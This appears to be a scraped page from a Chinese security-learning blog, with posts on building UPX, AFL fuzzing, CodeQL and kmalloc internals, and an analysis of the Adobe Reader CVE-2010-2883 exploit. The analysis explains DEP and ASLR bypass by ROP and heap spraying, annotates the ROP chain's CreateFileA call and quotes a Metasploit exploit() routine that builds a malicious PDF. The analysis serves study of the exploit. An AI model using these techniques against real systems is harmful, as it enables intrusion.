<p>解决：./configure CPPFLAGS=”$CPPFLAGS -std=c90 -fPIC”</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$export</span> UPX_UCCLDIR=<span class="string">&quot;~/ucl-1.03&quot;</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h4 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wget</span> http://pkgs.fedoraproject.org/repo/pkgs/zlib/zlib-1.2.11.tar.xz/sha512/b7f50ada138c7f93eb7eb1631efccd1d9f03a5e77b6c13c8b757017b2d462e19d2d3e01c50fad60a4ae1bc86d431f6f94c72c11ff410c25121e571953017cb67/zlib-1.2.11.tar.xz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解压：tar -xvf zlib-1.2.11.tar.xz</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> zlib-1.2.11/</span><br><span class="line">$./configure</span><br><span class="line"><span class="variable">$sudo</span> make install</span><br></pre></td></tr></table></figure>


<h4 id="编译upx-1"><a href="#编译upx-1" class="headerlink" title="编译upx"></a>编译upx</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> ~/upx</span><br><span class="line"><span class="variable">$make</span> all</span><br></pre></td></tr></table></figure>
<p>若没有报错,则编译成功</p>
<p>此时可在/src目录下找到upx.out文件</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/28/afl-fuzz-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/28/afl-fuzz-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">afl-fuzz-源码分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-04-28 18:13:06 / Modified: 21:46:49" itemprop="dateCreated datePublished" datetime="2021-04-28T18:13:06+08:00">2021-04-28</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="AFL-fuzz"><a href="#AFL-fuzz" class="headerlink" title="AFL-fuzz"></a>AFL-fuzz</h1><p>模糊测试不需要人过多的参与，也不像动态分析那样要求分析人员有丰富的知识。简单解释，它就是用大量的输入数据自动去执行程序，从而发现哪些输入能够使程序发生异常，进而分析可能存在的漏洞。</p>
<p>调试人员为程序提供一些输入，即最左侧的testcases，AFL加载后将其放入一个队列中。对于每一次迭代，AFL首先从队列中取出一个testcase，然后对它进行修剪，去除不必要的数据以提高运行效率；再然后对输入进行变异操作，变异的模式很多，可以产生很多新的testcase。对于这些新产生的输入，将它们送到目标程序运行，若能够产生新的执行路径或者导致程序崩溃，就把它再放到队列中。在整个过程中，程序崩溃会被记录下来，它可能代表一个潜藏的漏洞。</p>
<p>病毒分析、破解、内核、</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/27/codeql-learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/27/codeql-learn/" class="post-title-link" itemprop="url">codeql_learn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-04-27 14:44:41 / Modified: 21:48:57" itemprop="dateCreated datePublished" datetime="2021-04-27T14:44:41+08:00">2021-04-27</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CodeQL"><a href="#CodeQL" class="headerlink" title="CodeQL"></a>CodeQL</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>CodeQL是一个语义代码分析引擎，它允许我们将代码视为数据进行查询。编写一个查询，找到一个漏洞的所有变种，永远消除它。</p>
<p>它的整体思路是把源代码转化成一个可查询的数据库，通过Extractor模块对源代码工程进行关键信息分析提取，构成一个关系数据库。但是他的数据库并没有使用现有的数据库计数，而是一套基于文件的自己的实现。</p>
<blockquote>
<p>区别在哪？</p>
</blockquote>
<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>对于编译型语言,Extractor会监控编译过程，编译器每处理一个源代码文件，它都会收集源代码的相关信息，比如(语法信息–AST抽象语法树)、（语义信息–名称绑定、类型信息、运算操作等）、（控制流）、（数据流），同时也会复制一份源代码文件。</p>
<p>对于解释性语言，Extractor则直接分析源代码，得到类似的相关信息。</p>
<blockquote>
<p>解释性语言</p>
<p>编译型语言</p>
</blockquote>
<p>关键信息提取完成后，所有分析所需数据都导入到一个文件夹—CodeQL database（其中包括了源代码文件、关系数据、语言相关的 database schema（schema 定义了数据之间的相互关系）。）</p>
<h2 id="官方手册"><a href="#官方手册" class="headerlink" title="官方手册"></a>官方手册</h2><p><a target="_blank" rel="noopener" href="https://codeql.github.com/docs/codeql-cli/">https://codeql.github.com/docs/codeql-cli/</a></p>
<h2 id="安装CodeQL"><a href="#安装CodeQL" class="headerlink" title="安装CodeQL"></a>安装CodeQL</h2><p>1.下载分析程序：<a target="_blank" rel="noopener" href="https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip">https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip</a></p>
<p>2.下载相关库文件：<a target="_blank" rel="noopener" href="https://github.com/Semmle/ql">https://github.com/Semmle/ql</a></p>
<p>3.下载最新版的VScode，安装CodeQL扩展程序：<a target="_blank" rel="noopener" href="https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql">https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql</a></p>
<ul>
<li>到扩展中心配置相关参数</li>
</ul>
<p><img src="https://i.imgur.com/eUpyeiY.png"></p>
<p><img src="https://i.imgur.com/rPltxcs.png"></p>
<p><img src="https://i.imgur.com/cRd4nPv.png"></p>
<blockquote>
<p>这里填写的路径是分析程序的路径</p>
<p>首先将下载的分析程序解压</p>
<p>将codeql.cmd这个文件所在的路径复制到框里</p>
</blockquote>
<h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><h3 id="利用codeql利用uaf："><a href="#利用codeql利用uaf：" class="headerlink" title="利用codeql利用uaf："></a>利用codeql利用uaf：</h3><p><a target="_blank" rel="noopener" href="https://vasco-jofra.github.io/articles/codeql-kernel">https://vasco-jofra.github.io/articles/codeql-kernel</a></p>
<h4 id="kmalloc-源码分析"><a href="#kmalloc-源码分析" class="headerlink" title="kmalloc()源码分析"></a>kmalloc()源码分析</h4><h5 id="slab-h"><a href="#slab-h" class="headerlink" title="slab.h"></a>slab.h</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">【file:/include/linux/slab.h】</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * kmalloc - allocate memory</span></span><br><span class="line"><span class="comment"> * @size: how many bytes of memory are required.//多少比特的内存被申请</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.//分配的内存的类型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * kmalloc is the normal method of allocating memory//kmalloc是一种用来分配内存的普通办法</span></span><br><span class="line"><span class="comment"> * for objects smaller than page size in the kernel.//对那些对象比页大小还小的</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The @flags argument may be one of://flag的值可能是下面的其中之一</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_USER - Allocate memory on behalf of user.  May sleep.</span></span><br><span class="line"><span class="comment"> */</span>/为用户分配内存，可能会引起休眠</span><br><span class="line"> * %GFP_KERNEL - Allocate normal kernel ram.  May sleep.</span><br><span class="line"> *<span class="comment">//内核内存的常规分配，可能会引起休眠</span></span><br><span class="line"> * %GFP_ATOMIC - Allocation will <span class="keyword">not</span> sleep.  May use emergency pools.</span><br><span class="line"> *   For example, use <span class="keyword">this</span> inside interrupt handlers.</span><br><span class="line"> *<span class="comment">//该分配不会引起休眠,但可能会使用应急内存，通常用于中断处理中</span></span><br><span class="line"> * %GFP_HIGHUSER - Allocate pages from high memory.</span><br><span class="line"> *<span class="comment">//使用高端内存进行分配</span></span><br><span class="line"> * %GFP_NOIO - Do <span class="keyword">not</span> <span class="keyword">do</span> any I/O at all <span class="keyword">while</span> trying to get memory.</span><br><span class="line"> *<span class="comment">//分配内存时禁止任何IO操作</span></span><br><span class="line"> * %GFP_NOFS - Do <span class="keyword">not</span> make any fs calls <span class="keyword">while</span> trying to get memory.</span><br><span class="line"> *<span class="comment">//分配内存时，禁止任何文件系统操作</span></span><br><span class="line"> * %GFP_NOWAIT - Allocation will <span class="keyword">not</span> sleep.</span><br><span class="line"> *<span class="comment">//分配内存时禁止休眠</span></span><br><span class="line"> * %__GFP_THISNODE - Allocate node-local memory only.</span><br><span class="line"> *<span class="comment">//分配内存时，仅从本地节点内存中分配</span></span><br><span class="line"> * %GFP_DMA - Allocation suitable <span class="keyword">for</span> DMA.</span><br><span class="line"> *   Should only be used for kmalloc() caches. Otherwise, use a</span><br><span class="line"> *   slab created with SLAB_DMA.</span><br><span class="line"> *<span class="comment">//从DMA内存中分配合适的内存，应仅使用于kmalloc的cache分配；</span></span><br><span class="line"> * Also it is possible to <span class="built_in">set</span> different flags by OR<span class="number">&#x27;</span>ing</span><br><span class="line"> * in one <span class="keyword">or</span> more of the following additional @flags:</span><br><span class="line"> *</span><br><span class="line"> * %__GFP_COLD - Request cache-cold pages instead of</span><br><span class="line"> *   trying to <span class="keyword">return</span> cache-warm pages.</span><br><span class="line"> *<span class="comment">//用于请求分配冷热页中的冷页；</span></span><br><span class="line"> * %__GFP_HIGH - This allocation has high priority <span class="keyword">and</span> may use emergency pools.</span><br><span class="line"> *<span class="comment">//用于表示该分配优先级较高并可能会使用应急内存资源；</span></span><br><span class="line"> * %__GFP_NOFAIL - Indicate that <span class="keyword">this</span> allocation is in no way allowed to fail</span><br><span class="line"> *   (think twice before <span class="keyword">using</span>).</span><br><span class="line"> *<span class="comment">//用于指示该分配不允许分配失败，该标志需要慎用；</span></span><br><span class="line"> * %__GFP_NORETRY - If memory is <span class="keyword">not</span> immediately available,</span><br><span class="line"> *   then give up at once.</span><br><span class="line"> *<span class="comment">//如果分配内存未能够直接获取到，则不再尝试分配，直接放弃；</span></span><br><span class="line"> * %__GFP_NOWARN - If allocation fails, don<span class="number">&#x27;</span>t issue any warnings.</span><br><span class="line"> *<span class="comment">//如果分配过程中失败，不上报任何告警；</span></span><br><span class="line"> * %__GFP_REPEAT - If allocation fails initially, <span class="keyword">try</span> once more before failing.</span><br><span class="line"> *<span class="comment">//如果分配过程中失败，则尝试再次申请；</span></span><br><span class="line"> * There are other flags available as well, but these are <span class="keyword">not</span> intended</span><br><span class="line"> * <span class="keyword">for</span> general use, <span class="keyword">and</span> so are <span class="keyword">not</span> documented here. For a full <span class="built_in">list</span> of</span><br><span class="line"> * potential flags, always refer to linux/gfp.h.</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size)) &#123;<span class="comment">//__builtin_constant_p 是编译器gcc内置函数，用于判断一个值是否为编译时常量，如果是常数，函数返回1 ，否则返回0。此内置函数的典型用法是在宏中用于手动编译时优化。</span></span><br><span class="line">		<span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<span class="comment">//（即申请空间超过kmalloc()所能分配最大cache的大小）</span></span><br><span class="line">			<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; GFP_DMA)) &#123;</span><br><span class="line">			<span class="keyword">int</span> index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!index)</span><br><span class="line">				<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> kmem_cache_alloc_trace(kmalloc_caches[index],</span><br><span class="line">					flags, size);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果通过kmalloc_large()进行内存分配，将会经kmalloc_large()-&gt;kmalloc_order()-&gt;__get_free_pages()，最终通过Buddy伙伴算法申请所需内存。</p>
</blockquote>
<h5 id="slub-c"><a href="#slub-c" class="headerlink" title="slub.c"></a>slub.c</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">【file:/mm/slub.c】</span><br><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))<span class="comment">//同样判断申请是否超过最大cache大小，如果是则通过kmalloc_large()进行分配</span></span><br><span class="line">		<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">	s = kmalloc_slab(size, flags);<span class="comment">//接着通过申请大小及申请标志调用kmalloc_slab()查找适用的kmem_cache；最后通过slab_alloc()进行slab分配。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">	ret = slab_alloc(s, flags, _RET_IP_);</span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为啥这里又判断一次是否申请超过最大cache大小？</p>
</blockquote>
<h5 id="kmalloc-slab"><a href="#kmalloc-slab" class="headerlink" title="kmalloc_slab()"></a>kmalloc_slab()</h5><p>可以来看下kmalloc_slab()的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">【file:/mm/slab_commmon.c】</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Find the kmem_cache structure that serves a given size of</span></span><br><span class="line"><span class="comment"> * allocation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_SIZE)) &#123;</span><br><span class="line">		WARN_ON_ONCE(!(flags &amp; __GFP_NOWARN));</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!size)</span><br><span class="line">			<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">		index = size_index[size_index_elem(size)];</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		index = fls(size - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely((flags &amp; GFP_DMA)))</span><br><span class="line">		<span class="keyword">return</span> kmalloc_dma_caches[index];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> kmalloc_caches[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>如果申请的大小超过KMALLOC_MAX_SIZE最大值，则返回NULL表示失败；如果申请大小小于192,且不为0，将通过size_index_elem宏转换为下标后，经size_index全局数组取得索引值，否则将直接通过fls()取得索引值；最后如果开启了DMA内存配置且设置了GFP_DMA标志，将结合索引值通过kmalloc_dma_caches返回kmem_cache管理结构信息，否则将通过kmalloc_caches返回该结构。</p>
<p>由此可以看出kmalloc()实现较为简单，起分配所得的内存不仅是虚拟地址上的连续存储空间，同时也是物理地址上的连续存储空间。这是有别于后面将会分析到的vmalloc()申请所得的内存。</p>
</blockquote>
<h5 id="DMA内存分配"><a href="#DMA内存分配" class="headerlink" title="DMA内存分配"></a>DMA内存分配</h5><p>linux系统启动过程中，会初始化整个内核地址空间，将其划分为各个类型段，其中包括物理内存映射区(又称之为逻辑地址映射区)、虚拟内存分配区、高端页面映射区、系统保留映射区、DMA映射区(这个类似物理内存映射区，其映射的物理地址是连续的)这几个区域等等，linux内核在启动的时候通过arch/arm/include/asm/memory.h中的CONSISTENT_DMA_SIZE宏配置内核地址空间DMA大小。代码位置如下：</p>
<p>#ifndef CONSISTENT_DMA_SIZE<br>#define CONSISTENT_DMA_SIZE SZ_2M<br>#endif<br>CONSISTENT_DMA_SIZE 大小根据自己系统需求的情况来分配，比如做大数据高速采集一般这个DMA的值就应该设置大一些，否则在内核申请会报下面错误：</p>
<p>(NULL device <em>): dma_alloc_coherent size ****</em>  failed</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/17/cve-2010-2883-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/17/cve-2010-2883-2/" class="post-title-link" itemprop="url">cve-2010-2883-2</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-04-17 18:31:14 / Modified: 22:06:37" itemprop="dateCreated datePublished" datetime="2021-04-17T18:31:14+08:00">2021-04-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>DEP,数据执行保护，其基本原理是将数据所在内存页标识为不可执行。</p>
<p><img src="https://i.imgur.com/0qqIx33.png"></p>
<p>主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池执行代码）</p>
<p>DEP的保护对象是进程级别的，当某个进程的加载模块只要有一个模块不支持DEP，这个进程就不能贸然开启DEP，否则会发生异常。</p>
<p>Ret2libc：我们让程序跳转到一个已经存在的系统函数中，已经存在的系统函数必然存在于可执行页上，所以此时DEP是不会拦截的，Ret2libc的攻击原理也正是基于此。</p>
<p>三种比较有效的绕过DEP的exploit方法：</p>
<ol>
<li>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行。</li>
<li>通过跳转到VirualProtect函数来将shellcode所在内存页设置为可执行状态，然后再转入shellcode执行。</li>
<li>通过跳转到VirualAlloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到这段内存中执行。</li>
</ol>
<h3 id="CreateFileA-功能-创建一个文件或设备"><a href="#CreateFileA-功能-创建一个文件或设备" class="headerlink" title="CreateFileA();功能:创建一个文件或设备"></a>CreateFileA();功能:创建一个文件或设备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C24   4A801064  +-CALL 到 CreateFileA</span><br><span class="line">0C0C0C28   4A8522C8  | FileName &#x3D; &quot;iso88591&quot;    ; 创建一个名为iso88591的文件。</span><br><span class="line">0C0C0C2C   10000000  | Access &#x3D; GENERIC_ALL     ; 此文件访问权限为可读可写可执行。</span><br><span class="line">0C0C0C30   00000000  | ShareMode &#x3D; 0            ; 共享模式，0:阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。</span><br><span class="line">0C0C0C34   00000000  | pSecurity &#x3D; NULL         ; 此参数为NULL，则CreateFile返回的句柄，不能由应用程序可能创建的任何子进程继承，并且与返回的句柄关联的文件或设备将获取默认安全描述符。</span><br><span class="line">0C0C0C38   00000002  | Mode &#x3D; CREATE_ALWAYS     ; 始终创建一个新文件。</span><br><span class="line">0C0C0C3C   00000102  | Attributes &#x3D; HIDDEN|TEMPORARY    ; 文件属性：隐藏文件|临时文件</span><br><span class="line">0C0C0C40   00000000  +-hTemplateFile &#x3D; NULL     ; hTemplateFile为一个文件或设备句柄，表示按这个参数给出的句柄为模板创建文件。通常这个参数设置为NULL，为空表示不使用模板，一般为空。</span><br></pre></td></tr></table></figure>
<p>0C0C0C2C   10000000  | Access = GENERIC_ALL     ; 此文件访问权限为可读可写可执行。</p>
<p><img src="https://i.imgur.com/INBRrc4.png"></p>
<blockquote>
<p>注意是从0开始的，0x10000000转换为二进制就是1000000000000000000000000000，29是1。从0开始就是28.</p>
</blockquote>
<p>winhex中 00001f90机器码是58</p>
<p>rasm2 -a x86 -d 58可以看到是pop eax</p>
<p><img src="https://i.imgur.com/Qy96sES.png"></p>
<p>由于DEP的实施,不能直接跳到nop进行执行，需要先进行ROP使得shellcode得到执行，所以我们需要预测rop链的准确位置，由于内存分配是对齐的，这意味着如果我们用正确的大小的块，和正确的大小的喷射块，我们将确保每个喷射块开始，将在可预见的地址定位。再通过简单的计算，可以实现准确喷射。</p>
<p> 最后调用<code>memcopy</code>的时候，<code>目的地址</code>就是前面<code>MapViewOfFile()</code>返回的<code>文件映射基地址</code>，而<code>源地址</code>就是真正的<code>shellcode</code>代码，将它<code>复制</code>到一段<code>可执行可读写的内存段</code>，以此<code>绕过DEP</code>。由于构造的<code>ROP指令</code>均位于不受<code>ASLR</code>保护的<code>icucnv36.dll</code>模块，因此也可以<code>绕过ASLR保护</code>。正是由于<code>DEP</code>的存在，所以<code>堆栈空间</code>是不存在<code>可执行权限</code>的，所以，我们需要创建一个<code>文件映射对象</code>，将其<code>映射</code>到<code>可读可写可执行的内存块</code>，再把shellcode拷贝到那里，就可以执行了。</p>
<p>解码完<code>shellcode</code>,然后通过<code>TEB</code>、<code>PEB</code>等结构计算出<code>WinExec()</code>函数的地址,调用<code>WinExec(&quot;calc.exe&quot;,0x1)</code>弹出计算器。计算<code>库函数API地址</code>的shellcode使用的是<code>metasploit-framework</code>中的<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm">block_api.asm</a>,此版本为<code>最新版本</code>,近期<code>更新</code>过,与<code>样本</code>中的有些许差别。</p>
<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit()"></a>exploit()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def exploit</span><br><span class="line">    ttf_data &#x3D; make_ttf() # 构造ttf字体数据,SING表内容就在其中</span><br><span class="line"></span><br><span class="line">    js_data &#x3D; make_js(payload.encoded) # 构建Heap Spary js代码,ROP Chain及Payload就包含在里面</span><br><span class="line"></span><br><span class="line">    # Create the pdf</span><br><span class="line">    pdf &#x3D; make_pdf(ttf_data, js_data) # 构造pdf文件数据,将前面构造好的ttf字体数据和js代码放入其中</span><br><span class="line"></span><br><span class="line">    print_status(&quot;Creating &#39;#&#123;datastore[&#39;FILENAME&#39;]&#125;&#39; file...&quot;)</span><br><span class="line"></span><br><span class="line">    file_create(pdf) # 创建pdf文件</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
